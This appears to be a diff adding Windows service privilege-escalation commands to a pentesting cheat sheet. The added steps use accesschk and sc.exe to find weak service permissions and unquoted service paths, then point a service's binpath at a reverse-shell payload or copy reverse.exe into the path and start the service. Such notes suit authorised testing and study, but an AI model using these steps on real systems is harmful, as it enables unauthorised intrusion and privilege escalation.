@@ -691,6 +691,45 @@ sc.exe config {NAME} {OPTION}= {VALUE}
 Start/Stop a service:
 net start {NAME}
 net stop {NAME}
+
+# 1. Insecure Service Properties
+
+
+# Verify permissions of a service using accesschk
+.\accesschk.exe /accepteula -uwcqv user {SERVICE}
+
+# Query the configuration of a service:
+sc.exe qc {SERVICE}
+
+# Query the current state of a service:
+sc.exe query {SERVICE}
+
+# Configure binary path payload reverse shell
+config {SERVICE} binpath= "\"C:\{PAYLOAD PATH}\""
+
+# Start a service:
+net start {SERVICE}
+
+
+# 2. Unquoted Service Path
+
+# Verify permissions of to start service using accesschk
+.\accesschk.exe /accepteula -uwcqv user {SERVICE}
+
+# Verify permissions of to write using accesschk
+.\accesschk.exe /accepteula -uwcqv {BINARY PATH: ex. "C:\Program Files\Unquoted Path Service\"}
+
+# Copy payload to unquoted service path break point
+copy reverse.exe {BINARY PATH: ex. "C:\Program Files\Unquoted Path Service\Common.exe"}
+
+# Start a service:
+net start {SERVICE}
+
+# 3. Weak Registry Permissions
+
+# 4. Insecure Service Executables
+
+# 5. DLL Hijacking
 ```
 
 
